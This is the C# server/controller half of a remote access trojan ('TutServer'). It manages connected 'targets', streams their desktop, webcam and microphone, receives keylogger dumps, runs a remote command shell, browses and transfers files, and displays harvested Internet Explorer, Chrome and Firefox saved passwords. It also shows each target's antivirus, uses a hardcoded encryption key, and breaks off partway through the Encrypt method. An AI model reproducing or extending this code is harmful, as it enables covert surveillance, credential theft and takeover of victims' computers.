using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.IO;

namespace TutServer
{
    public partial class Form1 : Form
    {
        private const int xfer_copy = 1;
        private const int xfer_move = 2;

        private static Socket _serverSocket;
        private static List<Socket> _clientSockets = new List<Socket>();
        private const int _BUFFER_SIZE = 20971520;
        private const int _PORT = 100; //port number
        private static readonly byte[] _buffer = new byte[_BUFFER_SIZE];
        private int[] controlClients = { 0 };
        public static bool isCmdStarted = false;
        private string current_path = "drive";
        private string xfer_path = "";
        private int xfer_mode = 0;
        public static Form1 me;
        private string edit_content = "";
        private string fup_local_path = "";
        private int fdl_size = 0;
        private bool isFileDownload = false;
        private byte[] recvFile = new byte[1];
        private int write_size = 0;
        private string fdl_location = "";
        private bool isStartedServer = false;
        private bool reScanTarget = false;
        private int reScanStart = -1;
        private int killtarget = -1;
        private Socket killSocket;
        private bool multiRecv = false; //If remote desktop or microphone, or webcam stream enabled multiRecv = true;
        private bool rdesktop = false;
        public static double dx = 0;
        public static double dy = 0;
        public static int rkeyboard = 0;
        public static int rmouse = 0;
        public static int plx = 0;
        public static int ply = 0;
        public static int resx = 0;
        public static int resy = 0;
        public static int resdataav = 0;
        public static bool isrdFull = false;
        private RDesktop Rdxref;
        public static List<Form> routeWindow = new List<Form>();
        public static List<ToolStripItem> tsitem = new List<ToolStripItem>();
        public static List<string> tsrefname = new List<string>();
        public static List<string> getvalue = new List<string>();
        public static List<string> setvalue = new List<string>();
        public static string rdRouteUpdate = "route0.none";
        public static string wcRouteUpdate = "route0.none";
        public static bool protectLv = false;
        public static int rwriteLv = 0;
        public static bool only1 = false;
        public static TabPage selected = new TabPage();
        private List<TabPage> pages = new List<TabPage>();
        public static Button rbutton = new Button();
        public static TabPage setPagebackup = new TabPage();
        public static int setFocusBack = 1;
        public static int setFocusRouteID = -1;
        private bool austream = false;
        private audioStream astream = new audioStream();
        private bool wStream = false;
        public string remStart = "";
       // private bool uploadFinished = false; //dont know why this was used? lines 725 ,1979 , 1997
        private List<string> rMoveCommands = new List<string>();
        public Timer rmoveTimer = new Timer();


        public Form1()
        {
            me = this;
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            richTextBoxCMD.ReadOnly = true;
            richTextBoxCMD.BackColor = Color.Black;
            richTextBoxCMD.ForeColor = Color.White;
            comboBox1.SelectedIndex = 0;
            comboBox2.SelectedIndex = 0;
            comboBox3.SelectedIndex = 0;
            comboBox4.SelectedIndex = 0;
            label24.Hide();
            for (int a = 0; a < contextMenuStrip2.Items.Count; a++)
            {
                ToolStripItem i = contextMenuStrip2.Items[a];
                tsitem.Add(i);
                tsrefname.Add(i.Name);
            }
            for (int a = 0; a < contextMenuStrip3.Items.Count; a++)
            {
                ToolStripItem i = contextMenuStrip3.Items[a];
                tsitem.Add(i);
                tsrefname.Add(i.Name);
            }
            foreach (TabPage p in tabControl1.TabPages)
            {
                pages.Add(p);
            }

            Timer update = new Timer();
            update.Interval = 2000; // prev. 3000
            update.Tick += new EventHandler(updateValues);
            update.Start();
        }

        private void updateValues(object sender, EventArgs e)
        {
            if (setvalue.Count != 0)
            {
                Console.WriteLine("update setValue");
                List<string> tempInst = setvalue;

                try
                {
                    foreach (string task in setvalue)
                    {
                        foreach (TabPage t in tabControl1.TabPages)
                        {
                            bool breakTab = false;
                            Control.ControlCollection all = t.Controls;
                            foreach (Control c in all)
                            {
                                string name = task.Split('§')[0];

                                if (name == c.Name)
                                {
                                    if (name.StartsWith("textBox") || name.StartsWith("richTextBox"))
                                    {
                                        c.Text = task.Split('§')[1];
                                        tempInst.Remove(task);
                                    }
                                    if (name.StartsWith("checkBox"))
                                    {
                                        string param = task.Split('§')[1];
                                        bool set = false;
                                        if (param.ToLower() == "true") set = true;
                                        CheckBox cb = c as CheckBox;
                                        cb.Checked = set;
                                        tempInst.Remove(task);
                                    }
                                    if (name.StartsWith("comboBox"))
                                    {
                                        string param = task.Split('§')[1];
                                        ComboBox cb = c as ComboBox;
                                        cb.SelectedItem = param;
                                        tempInst.Remove(task);
                                    }
                                    if (name.StartsWith("listView"))
                                    {
                                        string param = task.Split('§')[1];
                                        int set = int.Parse(param);
                                        ListView lv = c as ListView;
                                        lv.Items[lv.SelectedIndices[0]].Selected = false;
                                        lv.Items[set].Selected = true;
                                        Console.WriteLine("setvalue INDEX: " + set.ToString());
                                        //lv.Focus();
                                        tempInst.Remove(task);
                                    }
                                    breakTab = true;
                                }
                            }

                            if (breakTab)
                            {
                                break;
                            }

                        }

                        if (task.Split('§')[0].StartsWith("tabControl1"))
                        {
                            Console.WriteLine("setValue tabControl1.SelectedPage");
                            string param = task.Split('§')[1];
                            tabControl1.SelectedTab = pages[int.Parse(param) - 1];
                            tempInst.Remove(task);
                            //Console.WriteLine(tempInst.Count.ToString());
                        }
                    }

                    setvalue = tempInst;

                }
                catch (Exception ex)
                {
                    //Do nothing
                    Console.WriteLine("Routed Window value update error  ERROR  =" + ex.Message);
                }
            }
            List<string> tmp = new List<string>();

            foreach (TabPage t in tabControl1.TabPages)
            {
                Control.ControlCollection all = t.Controls;
                foreach (Control c in all)
                {
                    //()(c.Name);
                    if (c.Name.StartsWith("button"))
                    {
                        tmp.Add(c.Name + "§" + c.Text);
                    }
                    if (c.Name.StartsWith("label"))
                    {
                        tmp.Add(c.Name + "§" + c.Text);
                    }
                    if (c.Name.StartsWith("checkBox"))
                    {
                        CheckBox cc = (CheckBox)c;
                        tmp.Add(c.Name + "§" + cc.Checked.ToString().ToLower());
                    }
                    if (c.Name.StartsWith("comboBox"))
                    {
                        ComboBox cb = (ComboBox)c;
                        tmp.Add(c.Name + "§" + cb.SelectedItem.ToString());
                    }
                    if (c.Name.StartsWith("textBox"))
                    {
                        tmp.Add(c.Name + "§" + c.Text);
                    }
                    if (c.Name.StartsWith("richTextBox"))
                    {
                        tmp.Add(c.Name + "§" + c.Text);
                    }
                    if (c.Name.StartsWith("listView"))
                    {
                        ListView lv = (ListView)c;
                        string select = "";
                        string items = lv.Name + "§";
                        if (lv.SelectedIndices.Count > 0)
                        {
                            select = lv.SelectedIndices[0].ToString();
                            //Console.WriteLine("LV Select Index Stored: " + select);
                        }
                        else
                        {
                            select = "-1";
                        }


                        foreach (ListViewItem lvi in lv.Items)
                        {
                            string emt = "";
                            int sindex = lvi.SubItems.Count;
                            int count = 0;
                            foreach (ListViewItem.ListViewSubItem si in lvi.SubItems)
                            {
                                if (count < sindex)
                                {
                                    emt += si.Text + "|";
                                }
                                else
                                {
                                    emt += si.Text;
                                }

                                count++;
                            }

                            items += emt + "§";
                        }
                        items += select;
                        tmp.Add(items);

                    }
                }
            }
            getvalue = tmp;
            selected = tabControl1.SelectedTab;
            //protectLv = false;
            //this.Text = getvalue.Count.ToString();

        }


        private void SetupServer()
        {
            //int t;
            //if(int.TryParse(txtBPortNumber.Text , out t) == false)
            //{
            //    _PORT = _PORT;
            //   // txtBPortNumber.Text == "2017";
            //}
            label1.Text = "Setting up server";
            _serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            _serverSocket.Bind(new IPEndPoint(IPAddress.Any, _PORT));
            _serverSocket.Listen(5);
            _serverSocket.BeginAccept(AcceptCallback, null);
            label1.Text = "Server is up and running\n";
        }


        private void listClients()
        {
            int i = 0;
            listView1.Items.Clear();

            foreach (Socket socket in _clientSockets)
            {
                ListViewItem lvi = new ListViewItem();
                lvi.Text = i.ToString();

                listView1.Items.Add(lvi);
                i++;
            }
        }

        private void CloseAllSockets()
        {
            isStartedServer = false;
            int id = 0;

            foreach (Socket socket in _clientSockets)
            {
                try
                {
                    sendCommand("dc", id);
                    socket.Shutdown(SocketShutdown.Both);
                    socket.Close();
                    socket.Dispose();
                }
                catch (Exception)
                {
                    Console.WriteLine("Client" + id + " failed to send dc request!");
                }
                id++;
            }

            _serverSocket.Close();
            _serverSocket.Dispose();

            _clientSockets.Clear();
        }



        //AcceptCallback (when a server accepting client to connect)

        private void AcceptCallback(IAsyncResult AR)
        {
            Socket socket;

            try
            {
                socket = _serverSocket.EndAccept(AR);
            }
            catch (Exception)
            {
                Console.WriteLine("Accept callback error");
                return;
            }

            _clientSockets.Add(socket);
            int id = _clientSockets.Count - 1;
            addlvClientCallback("Client " + id);
            string cmd = "getinfo-" + id.ToString();
            sendCommand(cmd, id);
            socket.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, socket);
            _serverSocket.BeginAccept(AcceptCallback, null);
        }

        private delegate void addlvClient(string clientid);

        private void addlvClientCallback(string clientid)
        {
            if (InvokeRequired) //was this.invokerequired
            {
                addlvClient k = new addlvClient(addlvClientCallback);
                Invoke(k, new object[] { clientid });
            }
            else
            {
                listView1.Items.Add(clientid);
            }
        }

        private delegate void restartServerCallback(int id);

        private void restartServer(int id)
        {
            if (InvokeRequired)
            {
                restartServerCallback callback = new restartServerCallback(restartServer);
                Invoke(callback, new object[] { id });
            }
            else
            {
                button1.PerformClick();
                button1.PerformClick();
                label24.ForeColor = Color.Red;
                label24.Text = "Client " + id.ToString() + " Disconnected\nOther Sessions restored!";
                label24.Show();
                Timer t = new Timer();
                t.Interval = 5000;
                t.Tick += new EventHandler(dismissUpdate);
                t.Start();
            }
        }

        private void dismissUpdate(object sender, EventArgs e)
        {
            Timer me = (Timer)sender;
            label24.Text = "";
            label24.ForeColor = Color.Black;
            label24.Hide();
            me.Stop();
        }

        private int getSocket(Socket socket)
        {
            int tracer = 0;

            foreach (Socket s in _clientSockets)
            {
                if (s == socket)
                {
                    break;
                }
                tracer++;
            }

            return tracer;
        }

        private delegate void setImageCallback(Bitmap image);

        private void setImage(Bitmap image) //this resource needs to be cleaned up it was using an aufull lot of memeory
        {
            if (InvokeRequired)
            {
                setImageCallback callback = new setImageCallback(setImage);
                if (image != null)
                {
                    try
                    {
                        Invoke(callback, new object[] { image });
                    }
                    catch //(Exception ex)
                    {
                       // MessageBox.Show("Connection Lost  ERROR Message = " + ex.Message);
                    }
                }
            }
            else
            {
                if (!isrdFull)
                {
                    if (image == null) Console.WriteLine("image is null");

                    if(image != null) // added this as there was sometimes flashes of white screen very annoying
                    {
                        pictureBox1.Image = image;
                    }
                   
                }
                else
                {
                    if(image != null) // added this as there was sometimes flashes of white screen very annoying main screen
                    {
                        Rdxref.image = image;
                    }
                       
                }

                if (rdRouteUpdate != "route0.none")
                {
                    string route = rdRouteUpdate.Split('.')[0];
                    int routeIndex = int.Parse(route.Replace("route", "")) - 1;
                    Form tRoute = routeWindow[routeIndex];
                    Control.ControlCollection elements = tRoute.Controls;
                    foreach (Control c in elements)
                    {
                        if (c.Tag == null) continue;
                        if (c.Tag.ToString() == rdRouteUpdate)
                        {
                            PictureBox rdUpdate = c as PictureBox;
                            rdUpdate.Image = image;
                        }
                    }
                }
            }
        }

        private delegate void setWebCamCallback(Bitmap image);

        private void setWebCam(Bitmap image)
        {
            if (InvokeRequired)
            {
                setWebCamCallback callback = new setWebCamCallback(setWebCam);
                Invoke(callback, new object[] { image });
            }
            else
            {
                pictureBox2.Image = image;
                if (wcRouteUpdate != "route0.none")
                {
                    string route = rdRouteUpdate.Split('.')[0];
                    int routeIndex = int.Parse(route.Replace("route", "")) - 1;
                    Form tRoute = routeWindow[routeIndex];
                    Control.ControlCollection elements = tRoute.Controls;
                    foreach (Control c in elements)
                    {
                        if (c.Tag == null) continue;
                        if (c.Tag.ToString() == wcRouteUpdate)
                        {
                            PictureBox wcUpdate = c as PictureBox;
                            wcUpdate.Image = image;
                        }
                    }
                }
            }
        }

        //Receive Callback (when client sends back data to server)


        private void ReceiveCallback(IAsyncResult AR)
        {
            Socket current = (Socket)AR.AsyncState;
            int received;
            bool dclient = false;

            if (!isStartedServer) return;

            try
            {
                received = current.EndReceive(AR);
            }
            catch (Exception)
            {
                int id = getSocket(current);
                reScanTarget = true;
                reScanStart = id;
                Console.WriteLine("Client forcefully disconnected");
                current.Close(); // Dont shutdown because the socket may be disposed and its disconnected anyway
                _clientSockets.Remove(current);
                restartServer(id);
                return;
            }


            byte[] recBuf = new byte[received];
            Array.Copy(_buffer, recBuf, received);
            bool ignoreFlag = false;

            if (multiRecv)
            {
                try
                {
                    string header = Encoding.Unicode.GetString(recBuf, 0, 8 * 2);
                    //Console.WriteLine("Header: " + header + "\nSize: " + recBuf.Length.ToString());
                    if (header == "rdstream")
                    {
                        using (MemoryStream stream = new MemoryStream()) //----------------remote desktop stream
                        {
                            stream.Write(recBuf, 8 * 2, recBuf.Length - 8 * 2);
                            //Console.WriteLine("multiRecv Length: " + recBuf.Length);
                            Bitmap deskimage = (Bitmap)Image.FromStream(stream); 
                            
                                if (resdataav == 0)
                                {
                                    resx = deskimage.Width; //for the mouse movements x and y to send to the remote desktop to move mouse to new x and y
                                    resy = deskimage.Height;
                                    resdataav = 1;
                                }
                                setImage(deskimage);
                                /*deskimage.Dispose();
                                deskimage = null;*/
                                //Console.Title = "Received image!!";
                                Array.Clear(recBuf, 0, received);
                                ignoreFlag = true;

                            GC.Collect(); //----------------------------------------------------------------------------------------added to cleanup resources
                            GC.WaitForPendingFinalizers();
                            System.Threading.Thread.SpinWait(5000);

                        }
                    }

                    if (header == "austream")
                    {
                        byte[] data = new byte[recBuf.Length];
                        Buffer.BlockCopy(recBuf, 8 * 2, data, 0, recBuf.Length - 8 * 2);
                        recBuf = null;
                        astream.bufferPlay(data);
                        ignoreFlag = true;
                    }

                    if (header == "wcstream") //-----------webcam stream
                    {
                        MemoryStream stream = new MemoryStream();

                        stream.Write(recBuf, 8 * 2, recBuf.Length - 8 * 2);
                        Console.WriteLine("multiRecv Length: " + recBuf.Length);

                        Bitmap camimage = (Bitmap)Image.FromStream(stream);

                        stream.Flush();
                        stream.Close();
                        stream.Dispose();
                        stream = null;
                        setWebCam(camimage);
                        Array.Clear(recBuf, 0, received);
                        ignoreFlag = true;
                    }
                }
                catch
                {
                   // MessageBox.Show("Someone tried to access this server without the proper credentials", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }

            if (isFileDownload && !ignoreFlag)
            {
                Buffer.BlockCopy(recBuf, 0, recvFile, write_size, recBuf.Length);
                write_size += recBuf.Length;

                if (write_size == fdl_size)
                {
                    string rLocation = fdl_location;
                    using (FileStream fs = File.Create(rLocation))
                    {
                        byte[] info = recvFile;
                        // Add some information to the file.
                        fs.Write(info, 0, info.Length);
                    }
                }

                Array.Clear(recvFile, 0, recvFile.Length);
                msgbox("File Download", "File receive confirmed!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                isFileDownload = false;
            }

            if (!isFileDownload && !ignoreFlag)
            {
                string text = Encoding.Unicode.GetString(recBuf);
                text = Decrypt(text);



                if (text.StartsWith("infoback;"))
                {
                    int id = int.Parse(text.Split(';')[1]);
                    string data = text.Split(';')[2];
                    string[] lines = data.Split('|');
                    //MessageBox.Show(data);
                    string name = lines[0];
                    string ip = lines[1];
                    string time = lines[2];
                    string av = lines[3];

                    setlvClientInfoCallback(name, ip, time, av, id);
                }


                if(text.StartsWith("ScreenCount")) //get screen count result back from the client 
                {
                    string screens = string.Empty;
                    
                    screens = text.Replace("ScreenCount", "").Replace(" ","");

                    foreach (char screen in screens)
                    {                 
                        setClientScreenCountCallBack(screen); //async call back                   
                    }

                }

                if (text.StartsWith("setproc|"))
                {
                    foreach (string line in text.Split('\n'))
                    {
                        if (line == "") continue;

                        string name = line.Split('|')[1];
                        string responding = line.Split('|')[2];
                        string title = line.Split('|')[3];
                        string priority = line.Split('|')[4];
                        string path = line.Split('|')[5];
                        string id = line.Split('|')[6];

                        setprocInfoCallback(name, responding, title, priority, path, id);
                    }

                    SortList(listView2);
                }

                if (text.StartsWith("cmdout§"))
                {
                    //MessageBox.Show("test");
                    string output = text.Split('§')[1];
                    output = output.Replace("cmdout", string.Empty);
                    append(output);
                }

                if (text.StartsWith("fdrivel§"))
                {
                    string data = text.Split('§')[1];

                    lvClear(listView3);

                    foreach (string drive in data.Split('\n'))
                    {
                        if (!drive.Contains("|")) continue;
                        string name = drive.Split('|')[0];
                        string size = convert(drive.Split('|')[1]);

                        addFileCallback(name, size, "N/A", name);
                    }
                }

                if (text.StartsWith("fdirl"))
                {
                    string data = text.Substring(5);
                    string[] entries = data.Split('\n');

                    foreach (string entry in entries)
                    {
                        if (entry == "") continue;
                        string name = entry.Split('§')[0];
                        string size = convert(entry.Split('§')[1]);
                        string crtime = entry.Split('§')[2];
                        string path = entry.Split('§')[3];
                        //Console.WriteLine(entry.Split('§')[1]);
                        addFileCallback(name, size, crtime, path);
                    }
                }

                if (text.StartsWith("backfile§"))
                {
                    string content = text.Split('§')[1];
                    startEditor(content, me);
                }

                if (text == "fconfirm")
                {
                    byte[] databyte = File.ReadAllBytes(fup_local_path);
                    loopSendByte(databyte);
                }

                if (text == "frecv")
                {
                    msgbox("File Upload", "File receive confirmed!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    //uploadFinished = true;
                }

                if (text.StartsWith("finfo§"))
                {
                    int size = int.Parse(text.Split('§')[1]);
                    fdl_size = size;
                    recvFile = new byte[fdl_size];
                    isFileDownload = true;
                    loopSend("fconfirm");
                }

                if (text.StartsWith("f1§"))
                {
                    string dir = text.Split('§')[1];

                    if (dir != "drive") parent(dir);
                    if (dir == "drive")
                    {
                        current_path = "drive";
                        loopSend("fdrive");
                        lvClear(listView3);
                    }
                }

                if (text.StartsWith("putklog"))
                {
                    string dump = text.Substring(7);
                    setLog(dump);
                }

                if (text.StartsWith("dclient"))
                {
                    Console.WriteLine("Client Disconnected");
                    dclient = true;
                    switchTab(tabPage1);
                    killtarget = getSocket(current);
                    killSocket = current;
                    int id = killtarget;
                    reScanTarget = true;
                    reScanStart = id;
                    Console.WriteLine("Timer Removed Client");
                    killSocket.Close(); // Dont shutdown because the socket may be disposed and its disconnected anyway
                    _clientSockets.Remove(killSocket);
                    restartServer(id);
                }

                if (text.StartsWith("alist"))
                {
                    lvClear(listView4);
                    string data = text.Substring(5);
                    int devices = 0;
                    foreach (string device in data.Split('§'))
                    {
                        string name = device.Split('|')[0];
                        string channel = device.Split('|')[1];
                        addAudio(name, channel);
                        devices++;
                    }
                    if (devices == 0)
                    {
                        msgbox("Warning", "No audio capture devices present on this target", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                }

                if (text.StartsWith("wlist"))
                {
                    lvClear(listView5);
                    string data = text.Substring(5);
                    int devices = 0;
                    foreach (string device in data.Split('§'))
                    {
                        if (device == "") continue;
                        string id = device.Split('|')[0];
                        string name = device.Split('|')[1];
                        addCam(id, name);
                        devices++;
                    }

                    if (devices == 0)
                    {
                        msgbox("Warning", "No video capture devices present on this target!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                }

                if (text.StartsWith("setstart§"))
                {
                    string sap = text.Split('§')[1];
                    remStart = sap;
                }

                if (text == "getpwu")
                {
                    System.Threading.Thread notify = new System.Threading.Thread(new System.Threading.ThreadStart(pwuNotification));
                    notify.Start();
                }

                if (text.StartsWith("iepw"))
                {
                    string[] ieLogins = text.Split('\n');
                    if (ieLogins[1] == "failed")
                    {
                        Console.WriteLine("no ie logins");
                    }
                    else
                    {
                        List<string> ielogin = ieLogins.ToList<string>();
                        ielogin.RemoveAt(0);
                        ieLogins = ielogin.ToArray();

                        foreach (string login in ieLogins)
                        {
                            string[] src = login.Split('§');
                            string user = src[0];
                            string password = src[1];
                            string url = src[2];
                            ListViewItem lvi = new ListViewItem();
                            lvi.Text = url;
                            lvi.SubItems.Add(user);
                            lvi.SubItems.Add(password);
                            lvAddItem(listView6, lvi, 1); // 1 = group Internet Explorer
                        }
                    }
                }

                if (text.StartsWith("gcpw"))
                {
                    string[] gcLogins = text.Split('\n');
                    if (gcLogins[1] == "failed")
                    {
                        Console.WriteLine("no gc logins");
                    }
                    else
                    {
                        List<string> gclogin = gcLogins.ToList();
                        gclogin.RemoveAt(0);
                        gcLogins = gclogin.ToArray();

                        foreach (string login in gcLogins)
                        {
                            string[] src = login.Split('§');
                            string user = src[1];
                            string password = src[2];
                            string url = src[0];
                            ListViewItem lvi = new ListViewItem();
                            lvi.Text = url;
                            lvi.SubItems.Add(user);
                            lvi.SubItems.Add(password);
                            lvAddItem(listView6, lvi, 0); // 0 = group Google Chrome
                        }
                    }
                }

                if (text.StartsWith("ffpw"))
                {
                    string[] ffLogins = text.Split('\n');
                    if (ffLogins[1] == "failed")
                    {
                        Console.WriteLine("no ff logins");
                    }
                    else
                    {
                        List<string> fflogin = ffLogins.ToList();
                        fflogin.RemoveAt(0);
                        ffLogins = fflogin.ToArray();

                        foreach (string login in ffLogins)
                        {
                            string[] src = login.Split('§');
                            string user = src[2];
                            string password = src[3];
                            string url = src[1];
                            ListViewItem lvi = new ListViewItem();
                            lvi.Text = url;
                            lvi.SubItems.Add(user);
                            lvi.SubItems.Add(password);
                            lvAddItem(listView6, lvi, 2); // 2 = group Firefox
                        }
                    }
                }

                if (text.StartsWith("error"))
                {
                    string code = text.Split('§')[1];
                    string title = text.Split('§')[2];
                    string message = text.Split('§')[3];
                    label24.ForeColor = Color.Gold;
                    label24.BackColor = Color.Black;
                    SetErrorText("Error " + code + "\n" + title + "\n" + message);
                    ShowError();
                    Timer t = new Timer();
                    t.Interval = 10000;
                    t.Tick += new EventHandler(dismissUpdate);
                    t.Start();
                    //msgbox("Error! Code: " + code, title + "\n" + message, MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
            try
            {
                if (!dclient) current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Connection Failed  ERROR MESSAGE = " + ex.Message);
            }

        }

        private delegate void SortListC(ListView lv);

        private void SortList(ListView lv)
        {
            if (InvokeRequired)
            {
                SortListC c = new SortListC(SortList);
                Invoke(c, new object[] { lv });
                return;
            }

            lv.Sorting = SortOrder.Ascending;
            lv.Sort();
        }

        private delegate void ShowErrorC();

        private void ShowError()
        {
            if (InvokeRequired)
            {
                ShowErrorC c = new ShowErrorC(ShowError);
                Invoke(c);
                return;
            }

            label24.Show();
        }

        private delegate void SetErrorTextC(string errorText);

        private void SetErrorText(string errorText)
        {
            if (InvokeRequired)
            {
                SetErrorTextC c = new SetErrorTextC(SetErrorText);
                Invoke(c, new object[] { errorText });
                return;
            }

            label24.Text = errorText;
        }

        private void pwuNotification()
        {
            System.Threading.Thread.Sleep(3000);
            //msgbox("Try Again!", "PasswordFox.exe is not downloaded please wait 5 seconds and try again\nDownload in progress!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            msgbox("Error!", "ff.exe (PasswordFox.exe) is not present on the target directory!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        private delegate void lvAddItemCallback(ListView lv, ListViewItem lvi, int group = -1);

        private void lvAddItem(ListView lv, ListViewItem lvi, int group = -1)
        {
            if (InvokeRequired)
            {
                lvAddItemCallback callback = new lvAddItemCallback(lvAddItem);
                Invoke(callback, new object[] { lv, lvi, group });
            }
            else
            {
                if (group != -1)
                {
                    lvi.Group = lv.Groups[group];
                }
                lv.Items.Add(lvi);
            }
        }

        private delegate void addCamCallback(string id, string name);

        private void addCam(string id, string name)
        {
            if (InvokeRequired)
            {
                addCamCallback callback = new addCamCallback(addCam);
                Invoke(callback, new object[] { id, name });
            }
            else
            {
                ListViewItem lvi = new ListViewItem();
                lvi.Text = id;
                lvi.SubItems.Add(name);
                listView5.Items.Add(lvi);
            }
        }

        private delegate void addAudioCallback(string name, string ch);

        private void addAudio(string name, string ch)
        {
            if (InvokeRequired)
            {
                addAudioCallback callback = new addAudioCallback(addAudio);
                Invoke(callback, new object[] { name, ch });
            }
            else
            {
                ListViewItem lvi = new ListViewItem(name);
                lvi.SubItems.Add(ch);
                listView4.Items.Add(lvi);
                listView4.Items[0].Selected = true;
            }
        }

        public delegate void switchTabC(TabPage tab);

        public void switchTab(TabPage tab)
        {
            if (InvokeRequired)
            {
                switchTabC callback = new switchTabC(switchTab);
                Invoke(callback, new object[] { tab });
            }
            else
            {
                tabControl1.SelectedTab = tab;
            }
        }

        private delegate void setLogCallback(string dump);

        private void setLog(string dump)
        {
            if (InvokeRequired)
            {
                setLogCallback callback = new setLogCallback(setLog);
                Invoke(callback, new object[] { dump });
            }
            else
            {
                richTextBox3.Text = dump;
            }
        }

        private delegate void lvClearCallback(ListView lv);

        private void lvClear(ListView lv)
        {
            if (InvokeRequired)
            {
                lvClearCallback callback = new lvClearCallback(lvClear);
                Invoke(callback, new object[] { lv });
            }
            else
            {
                lv.Items.Clear();
            }
        }

        private delegate void parentCallback(string directory);

        private void parent(string directory)
        {
            if (InvokeRequired)
            {
                parentCallback callback = new parentCallback(parent);
                Invoke(callback, new object[] { directory });
            }
            else
            {
                string command = "fdir§" + directory;
                loopSend(command);
                current_path = directory;
                listView3.Items.Clear();
            }
        }

        private delegate void msgboxCallback(string title, string text, MessageBoxButtons button, MessageBoxIcon icon);

        private void msgbox(string title, string text, MessageBoxButtons button, MessageBoxIcon icon)
        {
            if (InvokeRequired)
            {
                msgboxCallback callback = new msgboxCallback(msgbox);
                Invoke(callback, new object[] { title, text, button, icon });
            }
            else
            {
                MessageBox.Show(this, text, title, button, icon);
            }
        }

        private delegate void startEditorCallback(string content, Form1 parent);

        private void startEditor(string content, Form1 parent)
        {
            if (InvokeRequired)
            {
                startEditorCallback callback = new startEditorCallback(startEditor);
                Invoke(callback, new object[] { content, parent });
            }
            else
            {
                Edit writer = new Edit(content, parent);
                writer.Show();
            }
        }

        private string convert(string byt)
        {
            string stackName = "B";
            //Console.WriteLine(byt);

            if (byt == "N/A")
            {
                return "Directory";
            }

            try
            {
                float bytes = float.Parse(byt);
                float div_result = 0;

                if (bytes >= 0 && bytes < 1024)
                {
                    div_result = bytes;
                }

                if (bytes >= 1024 && bytes < (1024 * 1024))
                {
                    stackName = "KB";
                    div_result = bytes / 1024;
                }

                if (bytes >= (1024 * 1024) && bytes < (1024 * 1024 * 1024))
                {
                    stackName = "MB";
                    div_result = bytes / (1024 * 1024);
                }

                if (bytes >= (1024 * 1024 * 1024))
                {
                    stackName = "GB";
                    div_result = bytes / (1024 * 1024 * 1024);
                }

                string value = div_result.ToString("0.00");
                string final = value + " " + stackName;
                return final;
            }
            catch (Exception ex)
            {
                //Console.WriteLine(e);
                Console.WriteLine("files, converter error  ERROR = " + ex.Message);
                return "ERROR";
            }
        }

        private delegate void addFile(string name, string size, string crtime, string path);

        private void addFileCallback(string name, string size, string crtime, string path)
        {
            if (InvokeRequired)
            {
                addFile callback = new addFile(addFileCallback);
                Invoke(callback, new object[] { name, size, crtime, path });
            }
            else
            {
                ListViewItem lvi = new ListViewItem();
                lvi.Text = name;
                lvi.SubItems.Add(size);
                lvi.SubItems.Add(crtime);
                lvi.SubItems.Add(path);
                listView3.Items.Add(lvi);
                listView3.Items[0].Selected = true;
            }
        }

        private delegate void appendText(string text);

        private void append(string text)
        {
            if (InvokeRequired)
            {
                appendText callback = new appendText(append);
                Invoke(callback, new object[] { text });
            }
            else
            {
                richTextBoxCMD.Text += text;
            }
        }

        private delegate void setProcInfo(string name, string responding, string title, string priority, string path, string id);

        private void setprocInfoCallback(string name, string responding, string title, string priority, string path, string id)
        {
            if (InvokeRequired)
            {
                setProcInfo callback = new setProcInfo(setprocInfoCallback);
                Invoke(callback, new object[] { name, responding, title, priority, path, id });
            }
            else
            {
                ListViewItem lvi = new ListViewItem();
                lvi.Text = name;
                lvi.SubItems.Add(id);
                lvi.SubItems.Add(responding);
                lvi.SubItems.Add(title);
                lvi.SubItems.Add(priority);
                lvi.SubItems.Add(path);

                listView2.Items.Add(lvi);
            }

        }

        private delegate void setlvClientInfo(string name, string ip, string time, string av, int id);

        private void setlvClientInfoCallback(string name, string ip, string time, string av, int id)
        {
            if (InvokeRequired)
            {
                setlvClientInfo k = new setlvClientInfo(setlvClientInfoCallback);
                Invoke(k, new object[] { name, ip, time, av, id });
            }
            else
            {
                ListViewItem client = listView1.Items[id];
                client.SubItems.Add(name);
                client.SubItems.Add(ip);
                client.SubItems.Add(time);
                client.SubItems.Add(av);
            }
        }

        private delegate void setScreenCount(char screenCount); //this is the method for updating the choose screen combobox

        private void setClientScreenCountCallBack(char screenCount)
        {
         
            if (InvokeRequired)
            {
               
                setScreenCount callBack = new setScreenCount(setClientScreenCountCallBack);
                Invoke(callBack, new object[] {screenCount});
              
            }
            else
            {
               
                cmboChooseScreen.Items.Add(screenCount);
              
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (!isStartedServer)
            {
                SetupServer();
                isStartedServer = true;
                button1.Text = "Terminate Server";
                if (reScanTarget)
                {
                    //MessageBox.Show("rescan");
                    tabControl1.SelectedTab = tabPage1;
                    List<Socket> sock = _clientSockets;
                    List<Socket> conn = new List<Socket>();
                    foreach (Socket s in sock)
                    {
                        if (s.Connected) conn.Add(s);
                    }

                    _clientSockets = conn;
                    listView1.Items.Clear();

                    int id = 0;

                    foreach (Socket client in _clientSockets)
                    {
                        sendCommand("getinfo-" + id.ToString(), id);
                        id++;
                        //MessageBox.Show("getinfo-" + id.ToString());
                    }

                    reScanStart = -1;
                    reScanTarget = false;
                }
                return;
            }
            if (isStartedServer)
            {
                CloseAllSockets();
                label1.Text = "Server is offline";
                button1.Text = "Start Server";
                listView1.Items.Clear();
            }
        }

        public string Encrypt(string clearText)
        {
            string EncryptionKey = "MAKV2SPBNI99212";
            byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
            Console.WriteLine("PlainText command: " + clearText);
            using (Aes encryptor = Aes.Create())
